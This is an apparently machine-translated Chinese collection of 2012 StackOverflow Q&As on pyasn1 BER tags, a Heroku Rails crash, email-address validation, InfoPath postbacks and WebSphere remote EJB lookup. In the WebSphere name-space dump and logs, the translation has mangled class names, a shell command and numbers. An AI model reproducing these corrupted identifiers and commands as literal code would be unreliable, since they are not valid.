# StackOverflow 问答 13514000-13514999

# python - 如何从 asn1 编码数据中解码多个字节标签

> ID：13514002
> 
> 赞同：1
> 
> 时间：2012-11-22T13:42:31.643
> 
> 标签：python, asn.1

情况如下，我有一个 BER 编码（十六进制）文件，我想按照 BER 解码规则对数据进行解码。能够使用 "pyasn1" 解码大多数标签，但无法解码特殊标签，例如：`9F 1F`使用此规则。

我如何解码没有错误？
**提示**：它是数据的“OctetString”表示。

**示例代码**：

```
class MYData(univ.Set):
     tagSet = baseTagSet = tag.initTagSet(tag.Tag(tag.tagClassContext,
                                          tag.tagFormatSimple, 21))
     componentType = namedtype.NamedTypes(
         namedtype.OptionalNamedType('SampleField', univ.OctetString().subtype(
         implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 31)))
     ) 
```

那么，如何表示`9F1F`使用 pyasn1 的 typeID 呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T09:28:40.657

我可以通过以下安排解码您的基板：

```
from pyasn1.type import univ, tag
from pyasn1.codec.ber import decoder
from pyasn1 import debug

debug.setLogger(debug.Debug('all'))

firstItem = univ.OctetString().subtype(implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 31))
secondItem = univ.OctetString().subtype(implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 32))

substrate = '\x9f\x1f\x02"\x00\x9f \x08\x01\x04\xf4\x17\x0c\xf0\x8a-'
i1, substrate = decoder.decode(substrate, asn1Spec=firstItem)
print i1.prettyPrint()

i2, substrate = decoder.decode(substrate, asn1Spec=secondItem)
print i2.prettyPrint() 
```

也就是说，它看起来像是两个项目的串联，而不是类似记录的结构。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T16:05:04.043

您的代码按原样为我工作。9F 1F 标签看起来太大而无法放入单个八位字节，因此它编码为两个。由于它是一个隐式标签，它会替换原始标签。除此之外，我看不出它有什么特别之处。

无论如何，这是我的 Python 控制台：

```
>>> class MYData(univ.Set):
...      tagSet = baseTagSet = tag.initTagSet(tag.Tag(tag.tagClassContext,
...                                           tag.tagFormatSimple, 21))
...      componentType = namedtype.NamedTypes(
...          namedtype.OptionalNamedType('SampleField', univ.OctetString().subtype(
...          implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 31)))
...      )
>>> myData = MYData()
>>> myData['SampleField'] = 'A'
>>> print myData.prettyPrint()
MYData:
 SampleField=A
>>>
>>> encoder.encode(myData)
'\xb5\x04\x9f\x1f\x01A'
>>> v, _ = decoder.decode('\xb5\x04\x9f\x1f\x01A', asn1Spec=myData)
>>> print v.prettyPrint()
MYData:
 SampleField=A 
```

我正在使用取自[此处](http://pyasn1.sourceforge.net/download.html)的最新 pyasn1 版本。请澄清究竟是什么不按预期工作？

# ruby-on-rails - Rails 3.2.8 和 Heroku，引发应用程序错误

> ID：13514003
> 
> 赞同：2
> 
> 时间：2012-11-22T13:42:34.230
> 
> 标签：ruby-on-rails, ruby-on-rails-3, heroku, asset-pipeline

我正在尝试将我的 rails 3.2.8 应用程序部署到 heroku，但我一直收到此错误：

```
2012-11-22T13:26:30+00:00 app[web.1]: Exiting
2012-11-22T13:26:30+00:00 app[web.1]: => Booting WEBrick
2012-11-22T13:26:30+00:00 app[web.1]: => Call with -d to detach
2012-11-22T13:26:30+00:00 app[web.1]: => Rails 3.2.8 application starting in production on http://0.0.0.0:24003
2012-11-22T13:26:31+00:00 heroku[web.1]: Process exited with status 1
2012-11-22T13:26:31+00:00 heroku[web.1]: State changed from starting to crashed
2012-11-22T13:26:49+00:00 heroku[router]: at=error code=H10 desc="App crashed" method=GET path=/ host=facevid.herokuapp.com fwd= dyno= queue= wait= connect= service= status=503 bytes=
2012-11-22T13:26:49+00:00 heroku[router]: at=error code=H10 desc="App crashed" method=GET path=/favicon.ico host=facevid.herokuapp.com fwd= dyno= queue= wait= connect= service= status=503 bytes= 
```

这似乎是一个评估错误，所以我尝试在本地预编译，更改应用程序变量`config.assets.initialize_on_precompile = false`，也更改环境变量`config.serve_static_assets = true`。

我在本地环境中将捆绑安装作为生产环境，并使用 webrick 启动了生产环境，没有任何错误。

编辑：

我将添加我的 gemfile

```
source 'https://rubygems.org'
ruby '1.9.3'
gem 'heroku'
gem 'rails', '3.2.8'

# Bundle edge Rails instead:
# gem 'rails', :git => 'git://github.com/rails/rails.git'

# Database gem 
# gem 'sqlite3'
group :development, :test do
  gem 'mysql2'
end

# heroku needs
gem 'pg', :group => :production
gem 'heroku', :group => :production
gem 'thin', :group => :production

# Gems used only for assets and not required
# in production environments by default.
group :assets do
  gem 'sass-rails',   '~> 3.2.3'
  gem 'coffee-rails', '~> 3.2.1'

  # See https://github.com/sstephenson/execjs#readme for more supported runtimes
  # gem 'therubyracer', :platforms => :ruby
  gem "therubyracer"
  gem "less-rails" 
  gem 'twitter-bootstrap-rails'

  gem 'uglifier', '>= 1.0.3'
end

gem 'jquery-rails'

# Authentication gems
gem 'omniauth-facebook'
gem 'devise'
gem "koala" 
```

我还创建了一个要推送到 heroku 的 rails 3.2.8 应用程序的超级简单示例，我遇到了同样的错误，此应用程序的代码在这里[https://github.com/andresbravog/heroku-rails-3.2.8-测试](https://github.com/andresbravog/heroku-rails-3.2.8-test)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T19:29:49.810

好的，我会回答自己：我需要将 config.ru 文件添加到我的 repo 应用程序才能使用瘦。

希望能帮助到你

# java - 如何检查邮件地址是否存在？

> ID：13514005
> 
> 赞同：23
> 
> 时间：2012-11-22T13:42:37.753
> 
> 标签：java, email, smtp, mime-message

我正在使用**com.sun.mail.smtp.SMTPTransport**通过 Java 发送电子邮件。

我成功发送了电子邮件，但如果我将邮件发送到无效的电子邮件地址， **SMTPTransport不会给出任何错误。**

**有没有办法检查给定的邮件地址是否存在？**

我不是要检查邮件地址作为**客户端**，我需要检查作为**服务器端**。

我在许多论坛上发现了很多这样的问题，但我没有得到任何适当的解决方案。

我的代码是 -

```
String email = "reciever@theirDomain.com";

Properties props = new Properties();
props.put("mail.smtps.host", "mail.myDomain.com");
props.put("mail.smtps.auth", "true");
Session session = Session.getInstance(props, null);

MimeMessage msg = new MimeMessage(session);
msg.setFrom(new InternetAddress("Mail Demo <my_email@myDomain.com>"));
msg.setRecipients(Message.RecipientType.TO, email);
msg.setSubject("Mail Example");
msg.setSentDate(new Date(System.currentTimeMillis()));

String txt = "Message Body";

msg.setText(txt);
SMTPTransport st = (SMTPTransport)session.getTransport("smtps");
st.connect("mail.myDomain.com","my_email@myDomain.com","password");
st.sendMessage(msg, msg.getAllRecipients());

System.out.println("ServerResponse : " + st.getLastServerResponse()); 
```

它为有效和无效的 email_address 提供输出：- **250 OK id=1TbWgN-0007oY-8r**

请帮我解决问题。提前致谢。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-11-26T06:49:38.840

谢谢大家的回复。

我可以通过**MX Record 检查**来解决我的问题。

我使用此**[链接](http://www.rgagnon.com/javadetails/java-0452.html)** 来解决问题。愿这对某人也有用。

```
Hashtable env = new Hashtable();
env.put("java.naming.factory.initial",
             "com.sun.jndi.dns.DnsContextFactory");
DirContext ictx = new InitialDirContext( env );
Attributes attrs = ictx.getAttributes
                       ( hostName, new String[] { "MX" });
Attribute attr = attrs.get( "MX" );
if (( attr == null ) || ( attr.size() == 0 )) {
   attrs = ictx.getAttributes( hostName, new String[] { "A" });
   attr = attrs.get( "A" );
   if( attr == null )
         throw new NamingException
                  ( "No match for name '" + hostName + "'" );
} 
```

谢谢你。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-11-22T13:49:42.257

确认电子邮件地址的唯一方法是向其发送电子邮件，并要求用户按照电子邮件中的（唯一）链接返回您的网站。

# sharepoint - SharePoint InfoPath 表单回发问题

> ID：13514007
> 
> 赞同：5
> 
> 时间：2012-11-22T13:42:44.837
> 
> 标签：sharepoint, infopath

作为 SharePoint 开发人员，我正在审查发布到 SharePoint Online (Office 365) 环境的支持浏览器的 InfoPath 2010 表单。
InfoPath 表单包含多个控件——文本框、富文本框、下拉列表框、多选列表框、日期选择器和个人/组选择器——并发布到 SharePoint 表单库。用户面临的问题是，每当一个控件被更改并失去焦点时，表单就会得到回发。一些回发符合预期，因为另一个字段将因规则（条件验证、格式或操作）而更新。但其他回发我无法解释。尝试将控件的属性浏览器表单 > 回发设置设置为“从不”不会解决问题。
附加信息：下拉列表框和多选列表框通过使用绑定到 SharePoint 列表适配器的数据连接来接收它们的数据。在几个下拉列表框和多选列表框上设置了一个过滤器。
也许你能给我一个线索？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-03T17:42:38.597

尝试阅读这篇[博文](http://blogs.msdn.com/b/infopath/archive/2008/06/19/designing-browser-enabled-forms-for-performance-in-infopath-forms-services-part-2.aspx)。它对导致 InfoPath 表单回发的原因提供了一些很好的见解。

# websphere - 是 8.5 - 如何在服务器之间调用远程 ejb3

> ID：13514017
> 
> 赞同：1
> 
> 时间：2012-11-22T13:43:16.247
> 
> 标签：websphere

我有两台 WAS 8.5 服务器正在运行。在服务器 AI 中有一个带有 EJB3 bean 的 ear 文件。如果我在服务器 A 上进行本地查找，我会得到 bean，并且一切正常。

我想要做的是从另一台服务器调用 EJB3 bean。服务器 B 有这个代码：

```
final Hashtable props = new Hashtable();
props.put(Context.INITIAL_CONTEXT_FACTORY, "com.ibm.websphere.naming.WsnInitialContextFactory");
props.put(Context.PROVIDER_URL, "corbaloc:iiop:172.17.2.197:2809"); //172.17.2.197 is the ip of server A
final Context ctx = new javax.naming.InitialContext(props);
Object homeObject = ctx.lookup("java:global/myApp/test-ejb3/EJB3StatelessSessionBean!com.app.test.ejb3.EJB3SessionBeanRemote"); 
```

这会引发异常：

```
2012-11-22 14:52:50,438 INFO  [WebContainer : 48](com.app.test.ejb3tasks.EJB3ClientTask) - Failed to invoke EJB through WLstatelessRemoteEJB3TaskSessionBean interface.
javax.naming.NameNotFoundException: Context: Config71154VM0Node01Cell/applications, name: myApp/test-ejb3/EJB3StatelessSessionBean!com.app.test.ejb3.EJB3SessionBeanRemote: First component in name EJB3StatelessSessionBean!com.app.test.ejb3.EJB3SessionBeanRemote not found. [Root exception is org.omg.CosNaming.NamingContextPackage.NotFound: IDL:omg.org/CosNaming/NamingContext/NotFound:1.0]
at com.ibm.ws.naming.jndicos.CNContextImpl.mapNotFoundException(CNContextImpl.java:4563)
at com.ibm.ws.naming.jndicos.CNContextImpl.doLookup(CNContextImpl.java:1821)
at com.ibm.ws.naming.jndicos.CNContextImpl.doLookup(CNContextImpl.java:1776)
...
Caused by: 
org.omg.CosNaming.NamingContextPackage.NotFound: IDL:omg.org/CosNaming/NamingContext/NotFound:1.0
at com.ibm.ws.naming.ipcos.WsnOptimizedNamingImpl.do_resolve_complete_info(WsnOptimizedNamingImpl.java:568)
at com.ibm.ws.naming.cosbase.WsnOptimizedNamingImplBase.resolve_complete_info(WsnOptimizedNamingImplBase.java:2169)
at com.ibm.WsnOptimizedNaming._NamingContextStub.resolve_complete_info(_NamingContextStub.java:538)
at com.ibm.ws.naming.jndicos.CNContextImpl$2.run(CNContextImpl.java:2957)
at com.ibm.ws.naming.jndicos.CNContextImpl$2.run(CNContextImpl.java:2953)
at com.ibm.ws.naming.util.CommonHelpers.retry(CommonHelpers.java:801)
at com.ibm.ws.naming.jndicos.CNContextImpl.cosResolve(CNContextImpl.java:2951)
at com.ibm.ws.naming.jndicos.CNContextImpl.doLookup(CNContextImpl.java:1817)
... 40 more 
```

服务器 A（目标服务器）dumpNameSpace：

```

    32（顶部）/applications/com.ibm.ws.AppNameSpaces/myApp
       32 javax.命名.上下文
       33（顶部）/applications/com.ibm.ws.AppNameSpaces/myApp/root
       33 javax.命名.上下文
       34（顶部）/applications/com.ibm.ws.AppNameSpaces/myApp/root/AppName
       34 java.lang.String
       35（顶部）/applications/com.ibm.ws.AppNameSpaces/myApp/root/test-ejb3
       35 javax.命名.上下文
       36 [绑定名称不可用。] [类名称不可用。]
       36 错误：收到以下命名异常：javax.naming.NamingException：发生意外异常。[根异常是 java.lang.StackOverflowError]
       37 [绑定名称不可用。] [类名称不可用。]
       37 错误：收到以下命名异常：javax.naming.NamingException：发生意外异常。[根异常是 java.lang.StackOverflowError]
       38（顶部）/applications/com.ibm.ws.AppNameSpaces/myApp/root/test-ejb3/EJB3StatefulSessionBean!com.app.test.ejb3.EJB3SessionBeanRemote
       38 com.app.test.ejb3.EJB3SessionBeanRemote
       39（顶部）/applications/com.ibm.ws.AppNameSpaces/myApp/root/test-ejb3/EJB3StatelessSessionBean!com.app.test.ejb3.EJB3SessionBeanRemote
       39 com.app.test.ejb3.EJB3SessionBeanRemote
       40（顶部）/applications/com.ibm.ws.AppNameSpaces/myApp/root/simulation-ng-business-2.5.9
       40 javax.命名.上下文
       41（顶部）/applications/com.ibm.ws.AppNameSpaces/myApp/root/simulation-ng-business-2.5.9/SimpleSession!com.app.test.ejb.session.SimpleSessionHome
       41 com.app.test.ejb.session.SimpleSessionHome
       42 [绑定名称不可用。] [类名称不可用。]
       42 错误：收到以下命名异常：javax.naming.NamingException：发生意外异常。[根异常是 java.lang.StackOverflowError]
       43 [绑定名称不可用。] [类名称不可用。]
       43 错误：收到以下命名异常：javax.naming.NamingException：发生意外异常。[根异常是 java.lang.StackOverflowError]
       44 [绑定名称不可用。] [类名称不可用。]
       44 错误：收到以下命名异常：javax.naming.NamingException：发生意外异常。[根异常是 java.lang.StackOverflowError]
       45 [绑定名称不可用。] [类名称不可用。]
       45 错误：收到以下命名异常：javax.naming.NamingException：发生意外异常。[根异常是 java.lang.StackOverflowError]
       46（顶部）/applications/com.ibm.ws.AppNameSpaces/myApp/root/simulation-ng-business-2.5.9/SessionAnyTask!com.app.test.ejb.session.SessionAnyTaskHome
       46 com.app.test.ejb.session.SessionAnyTaskHome
       47（顶部）/applications/com.ibm.ws.AppNameSpaces/myApp/root/simulation-ng-business-2.5.9/SessionStateful!com.app.test.ejb.session.SessionStatefulHome
       47 com.app.test.ejb.session.SessionStatefulHome
       48 [绑定名称不可用。] [类名称不可用。]
       48 错误：收到以下命名异常：javax.naming.NamingException：发生意外异常。[根异常是 java.lang.StackOverflowError]
       49（顶部）/applications/com.ibm.ws.AppNameSpaces/myApp/root/simulation-ng-business-2.5.9/SessionJDBC!com.app.test.ejb.session.SessionJDBCHome
       49 com.app.test.ejb.session.SessionJDBCHome
       50（顶部）/applications/com.ibm.ws.AppNameSpaces/myApp/root/simulation-ng-business-2.5.9/JDBCDirect!com.app.test.ejb.session.JDBCDirectHome
       50 com.app.test.ejb.session.JDBCDirectHome
       51（顶部）/applications/com.ibm.ws.AppNameSpaces/isclite
       51 javax.命名.上下文
       52（顶部）/applications/com.ibm.ws.AppNameSpaces/isclite/root
       第52章
       53（顶部）/applications/com.ibm.ws.AppNameSpaces/isclite/root/AppName
       第53章
       61（顶部）/applications/com.ibm.ws.AppNameSpaces/ibmasyncrsp/root
       第61章
       62（顶部）/applications/com.ibm.ws.AppNameSpaces/ibmasyncrsp/root/AppName
       62 java.lang.String
       63（顶部）/applications/com.ibm.ws.AppNameSpaces/filetransferSecured
       63 javax.命名.上下文
       64（顶部）/applications/com.ibm.ws.AppNameSpaces/filetransferSecured/root
       64 javax.命名.上下文
       65（顶部）/applications/com.ibm.ws.AppNameSpaces/filetransferSecured/root/AppName
       65 java.lang.String
       66（顶部）/应用程序/单元格 javax.naming.Context
       66 链接到上下文：Config71154VM0Node01Cell
       67（顶部）/applications/myApp javax.naming.Context
       68（顶部）/applications/myApp/simulation-ng-business-2.5.9
       68 javax.命名.上下文
       69 [绑定名称不可用。] [类名称不可用。]
       69 错误：收到以下命名异常：javax.naming.NamingException：发生意外异常。[根异常是 java.lang.StackOverflowError]
       70（顶部）/applications/myApp/simulation-ng-business-2.5.9/JDBCDirect!com.app.test.ejb.session.JDBCDirectHome
       70 com.app.test.ejb.session.JDBCDirectHome
       71 [绑定名称不可用。] [类名称不可用。]
       71 错误：收到以下命名异常：javax.naming.NamingException：发生意外异常。[根异常是 java.lang.StackOverflowError]
       72 [绑定名称不可用。] [类名称不可用。]
       72 错误：收到以下命名异常：javax.naming.NamingException：发生意外异常。[根异常是 java.lang.StackOverflowError]
       73 [绑定名称不可用。] [类名称不可用。]
       73 错误：收到以下命名异常：javax.naming.NamingException：发生意外异常。[根异常是 java.lang.StackOverflowError]
       74（顶部）/applications/myApp/simulation-ng-business-2.5.9/SessionStateful!com.app.test.ejb.session.SessionStatefulHome
       74 com.app.test.ejb.session.SessionStatefulHome
       75 [绑定名称不可用。] [类名称不可用。]
       75 错误：收到以下命名异常：javax.naming.NamingException：发生意外异常。[根异常是 java.lang.StackOverflowError]
       76（顶部）/applications/myApp/simulation-ng-business-2.5.9/SessionJDBC!com.app.test.ejb.session.SessionJDBCHome
       76 com.app.test.ejb.session.SessionJDBCHome
       77（顶部）/applications/myApp/simulation-ng-business-2.5.9/SessionAnyTask!com.app.test.ejb.session.SessionAnyTaskHome
       77 com.app.test.ejb.session.SessionAnyTaskHome
       78（顶部）/applications/myApp/simulation-ng-business-2.5.9/SimpleSession!com.app.test.ejb.session.SimpleSessionHome
       78 com.app.test.ejb.session.SimpleSessionHome
       79（顶部）/applications/myApp/test-ejb3
       第79章
       80（顶部）/applications/myApp/test-ejb3/EJB3StatelessSessionBean!com.app.test.ejb3.EJB3SessionBeanRemote
       80 com.app.test.ejb3.EJB3SessionBeanRemote
       81 [绑定名称不可用。] [类名称不可用。]
       81 错误：收到以下命名异常：javax.naming.NamingException：发生意外异常。[根异常是 java.lang.StackOverflowError]
       82 [绑定名称不可用。] [类名称不可用。]
       82 错误：收到以下命名异常：javax.naming.NamingException：发生意外异常。[根异常是 java.lang.StackOverflowError]
       83（顶部）/applications/myApp/test-ejb3/EJB3StatefulSessionBean!com.app.test.ejb3.EJB3SessionBeanRemote
       83 com.app.test.ejb3.EJB3SessionBeanRemote
       84（顶部）/applications/SchedulerCalendars javax.naming.Context
       85（顶部）/applications/SchedulerCalendars/Calendars javax.naming.Context
       86（顶部）/applications/SchedulerCalendars/Calendars/DefaultUserCalendar!com.ibm.websphere.scheduler.UserCalendarHome
       86 com.ibm.websphere.scheduler.UserCalendarHome
       87（顶部）/applications/SchedulerCalendars/Calendars/DefaultUserCalendar
       87 com.ibm.websphere.scheduler.UserCalendarHome
       88（顶部）/应用程序/查询 javax.naming.Context
       89（顶部）/applications/query/querybean javax.naming.Context
       90 [绑定名称不可用。] [类名称不可用。]
       90 错误：收到以下命名异常：javax.naming.NamingException：发生意外异常。[根异常是 java.lang.StackOverflowError]
       91（顶部）/applications/query/querybean/Query!com.ibm.websphere.ejbquery.QueryHome
       91 com.ibm.websphere.ejbquery.QueryHome
       92（顶部）/applications/DefaultApplication javax.naming.Context
       93（顶部）/applications/DefaultApplication/Increment javax.naming.Context
       94（顶部）/applications/ManagementEJB javax.naming.Context
       95（顶部）/applications/ManagementEJB/mejb javax.naming.Context
       96（顶部）/applications/ManagementEJB/mejb/Management javax.management.j2ee.ManagementHome
       97（顶部）/applications/ManagementEJB/mejb/Management!javax.management.j2ee.ManagementHome
       97 javax.management.j2ee.ManagementHome
       98（顶部）/持久的 javax.naming.Context
       99（顶部）/persistent/cell javax.naming.Context
       99 链接到上下文：Config71154VM0Node01Cell
      128（顶部）/nodes/Config71154VM0Node01/servers/server1/com/ibm/websphere/ejbquery
      第128章
      129（顶部）/nodes/Config71154VM0Node01/servers/server1/com/ibm/websphere/ejbquery/Query
      第129章
      130（顶部）/nodes/Config71154VM0Node01/servers/server1/cell
      第130章
      130 链接到上下文：Config71154VM0Node01Cell
      131（顶部）/nodes/Config71154VM0Node01/servers/server1/jdbc
      第131章
      132（顶部）/nodes/Config71154VM0Node01/servers/server1/jdbc/DefaultEJBTimerDataSource
      第132章
      133（顶部）/nodes/Config71154VM0Node01/servers/server1/wm
      第133章
      134（顶部）/nodes/Config71154VM0Node01/servers/server1/wm/default
      第134章
      135（顶部）/nodes/Config71154VM0Node01/servers/server1/wm/ard
      第135章
      136（顶部）/nodes/Config71154VM0Node01/servers/server1/jta
      第136章
      137（顶部）/nodes/Config71154VM0Node01/servers/server1/jta/usertransaction
      第137章
      138（顶部）/nodes/Config71154VM0Node01/servers/server1/UserRegistry
      第138章
      139（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer
      第139章
      140（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/ManagementEJB
      第140章
      141（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/ManagementEJB/mejb.jar
      第141章
      142（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/ManagementEJB/mejb.jar/EJBFactory
      第142章
      143（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/ManagementEJB/EJBFactory
      第143章
      144（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/DefaultApplication
      第144章
      145（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/DefaultApplication/Increment.jar
      第145章
      146（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/DefaultApplication/Increment.jar/EJBFactory
      第146章
      147（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/DefaultApplication/EJBFactory
      第147章
      148（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/SchedulerCalendars
      第148章
      149（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/SchedulerCalendars/Calendars.jar
      第149章
      150（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/SchedulerCalendars/Calendars.jar/EJBFactory
      150 com.ibm.websphere.ejbcontainer.EJBFactory
      151（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/SchedulerCalendars/EJBFactory
      第151章
      152（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/myApp
      第152章
      153（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/myApp/EJBFactory
      第153章
      154（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/myApp/ejb
      第154章
      155（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/myApp/ejb/simulation-ng-business-2.5.9.jar
      第155章
      156（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/myApp/ejb/simulation-ng-business-2.5.9.jar/EJBFactory
      第156章
      157（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/myApp/ejb/test-ejb3.jar
      第157章
      158（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/myApp/ejb/test-ejb3.jar/EJBFactory
      第158章
      159（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/ivtApp
      第159章
      160（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/ivtApp/ivtEJB.jar
      第160章
      161（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/ivtApp/ivtEJB.jar/EJBFactory
      第161章
      162（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/ivtApp/EJBFactory
      第162章
      163（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/query
      第163章
      164（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/query/EJBFactory
      第164章
      165（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/query/querybean.jar
      第165章
      166（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.websphere.ejbcontainer/query/querybean.jar/EJBFactory
      第166章
      167（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.isc
      第167章
      168（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.isc/PluginRegistry
      第168章
      169（顶部）/nodes/Config71154VM0Node01/servers/server1/com.ibm.isc/PluginRegistry/Config71154VM0Node01
      第169章
      170（顶部）/nodes/Config71154VM0Node01/servers/server1/ejb
      第170章
      171（顶部）/nodes/Config71154VM0Node01/servers/server1/ejb/mgmt
      第171章
      172（顶部）/nodes/Config71154VM0Node01/servers/server1/ejb/mgmt/MEJB
      第172章
      173（顶部）/nodes/Config71154VM0Node01/servers/server1/ejb/ivtEJBObject
      第173章
      174（顶部）/nodes/Config71154VM0Node01/servers/server1/ejb/myApp
      第174章
      175（顶部）/nodes/Config71154VM0Node01/servers/server1/ejb/myApp/ejb
      第175章
      176（顶部）/nodes/Config71154VM0Node01/servers/server1/ejb/myApp/ejb/test-ejb3.jar
      第176章
      177（顶部）/nodes/Config71154VM0Node01/servers/server1/ejb/myApp/ejb/test-ejb3.jar/EJB3StatelessSessionBean#com.app.test.ejb3.EJB3SessionBeanRemote
      第177章
      178（顶部）/nodes/Config71154VM0Node01/servers/server1/ejb/myApp/ejb/test-ejb3.jar/EJB3StatefulSessionBean#com.app.test.ejb3.EJB3SessionBeanRemote
      178 com.app.test.ejb3.EJB3SessionBeanRemote
      179（顶部）/nodes/Config71154VM0Node01/servers/server1/servername
      第179章
      180（顶部）/nodes/Config71154VM0Node01/servers/server1/SecurityServer
      180 com.ibm.ws.security.server._SecurityServer_Stub
      181（顶部）/nodes/Config71154VM0Node01/servers/server1/com.app.test.ejb3.EJB3SessionBeanRemote
      第181章
      182（顶部）/nodes/Config71154VM0Node01/servers/server1/simulation
      第182章
      183（顶部）/nodes/Config71154VM0Node01/servers/server1/simulation/ejb
      第183章
      184（顶部）/nodes/Config71154VM0Node01/servers/server1/simulation/ejb/SessionJDBC
      184 com.app.test.ejb.session.SessionJDBCHome
      185（顶部）/nodes/Config71154VM0Node01/servers/server1/simulation/ejb/Account
      第185章
      186（顶部）/nodes/Config71154VM0Node01/servers/server1/simulation/ejb/SimpleSession
      第186章
      187（顶部）/nodes/Config71154VM0Node01/servers/server1/simulation/ejb/SessionAnyTask
      第187章
      188（顶部）/nodes/Config71154VM0Node01/servers/server1/simulation/ejb/JDBCDirect
      188 com.app.test.ejb.session.JDBCDirectHome
      189（顶部）/nodes/Config71154VM0Node01/servers/server1/simulation/ejb/SessionStateful
      189 com.app.test.ejb.session.SessionStatefulHome
      190（顶部）/nodes/Config71154VM0Node01/servers/server1/simulation/ejb/Customer
      190 com.app.test.ejb.entity.CustomerHome

```

```
猫 SystemOut.log | grep CNTR0167I > /tmp/CNTR0167I.txt
[11/28/12 10:54:04:053 IST] 00000040 EJBContainerI I CNTR0167I：服务器正在绑定 ejb/test-ejb3.jar 模块中 EJB3StatefulSessionBean 企业 bean 的 com.app.test.ejb3.EJB3SessionBeanRemote 接口myApp 应用程序。绑定位置为：ejb/myApp/ejb/test-ejb3.jar/EJB3StatefulSessionBean#com.app.test.ejb3.EJB3SessionBeanRemote
[11/28/12 10:54:04:055 IST] 00000040 EJBContainerI I CNTR0167I：服务器正在绑定 ejb/test-ejb3.jar 模块中 EJB3StatefulSessionBean 企业 bean 的 com.app.test.ejb3.EJB3SessionBeanRemote 接口myApp 应用程序。绑定位置为：com.app.test.ejb3.EJB3SessionBeanRemote
[11/28/12 10:54:04:056 IST] 00000040 AbstractEJBRu I CNTR0167I：服务器正在绑定 ejb/test-ejb3.jar 模块中 EJB3StatefulSessionBean 企业 bean 的 com.app.test.ejb3.EJB3SessionBeanRemote 接口myApp 应用程序。绑定位置为：java:global/myApp/test-ejb3/EJB3StatefulSessionBean!com.app.test.ejb3.EJB3SessionBeanRemote
[11/28/12 10:54:04:057 IST] 00000040 EJBContainerI I CNTR0167I：服务器正在绑定 ejb/test-ejb3.jar 模块中 EJB3StatefulSessionBean 企业 bean 的 com.app.test.ejb3.EJB3SessionBeanLocal 接口myApp 应用程序。绑定位置为：ejblocal:myApp/ejb/test-ejb3.jar/EJB3StatefulSessionBean#com.app.test.ejb3.EJB3SessionBeanLocal
[11/28/12 10:54:04:058 IST] 00000040 EJBContainerI I CNTR0167I：服务器正在绑定 ejb/test-ejb3.jar 模块中 EJB3StatefulSessionBean 企业 bean 的 com.app.test.ejb3.EJB3SessionBeanLocal 接口myApp 应用程序。绑定位置为：ejblocal:com.app.test.ejb3.EJB3SessionBeanLocal
[11/28/12 10:54:04:058 IST] 00000040 AbstractEJBRu I CNTR0167I：服务器正在绑定 ejb/test-ejb3.jar 模块中 EJB3StatefulSessionBean 企业 bean 的 com.app.test.ejb3.EJB3SessionBeanLocal 接口myApp 应用程序。绑定位置为：java:global/myApp/test-ejb3/EJB3StatefulSessionBean!com.app.test.ejb3.EJB3SessionBeanLocal
[11/28/12 10:54:04:064 IST] 00000040 EJBContainerI I CNTR0167I：服务器正在绑定 ejb/test-ejb3.jar 模块中 EJB3StatelessSessionBean 企业 bean 的 com.app.test.ejb3.EJB3SessionBeanRemote 接口myApp 应用程序。绑定位置为：ejb/myApp/ejb/test-ejb3.jar/EJB3StatelessSessionBean#com.app.test.ejb3.EJB3SessionBeanRemote
[11/28/12 10:54:04:065 IST] 00000040 AbstractEJBRu I CNTR0167I：服务器正在绑定 ejb/test-ejb3.jar 模块中 EJB3StatelessSessionBean 企业 bean 的 com.app.test.ejb3.EJB3SessionBeanRemote 接口myApp 应用程序。绑定位置为：java:global/myApp/test-ejb3/EJB3StatelessSessionBean!com.app.test.ejb3.EJB3SessionBeanRemote
